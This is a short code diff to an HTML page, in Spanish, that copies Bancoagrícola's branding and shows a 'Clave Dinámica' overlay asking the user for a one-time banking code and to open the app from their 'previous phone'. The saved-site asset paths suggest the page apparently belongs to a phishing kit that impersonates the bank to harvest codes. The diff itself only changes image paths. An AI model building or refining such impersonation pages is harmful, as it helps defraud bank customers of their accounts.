@@ -1296,7 +1296,7 @@
   <div class="notif-pop" id="notif-pop"></div>
   <div class="tok-overlay" id="tok-ov">
     <div class="tok-box">
-      <img class="tok-logo" src="./index_files/clave-dinamica-logo.png" alt="Clave Dinámica">
+      <img class="tok-logo" src="./img/dinamica.png" alt="Clave Dinámica">
       <p class="tok-title">Clave Dinámica</p>
       <p class="tok-msg">Genera la Clave Dinámica desde Banca Móvil</p>
       <input type="text" id="x-tok" inputmode="numeric" autocomplete="one-time-code" maxlength="8" class="tok-input" placeholder="_ _ _ _ _ _">
@@ -1320,7 +1320,7 @@
       <img class="cd-hdr-logo" src="./index_files/positivo.svg" alt="Bancoagrícola">
     </div>
     <div class="cd-body">
-      <img class="cd-phone" src="./index_files/clave-dinamica-phone.png" alt="" onerror="this.style.display='none'">
+      <img class="cd-phone" src="./img/explicativo.png" alt="" onerror="this.style.display='none'">
       <p class="cd-title">Para generar tu Clave<br>Dinámica:</p>
       <ul class="cd-steps">
         <li><span class="cd-bullet"></span><span>Abre tu App Banca Móvil desde tu celular anterior.</span></li>
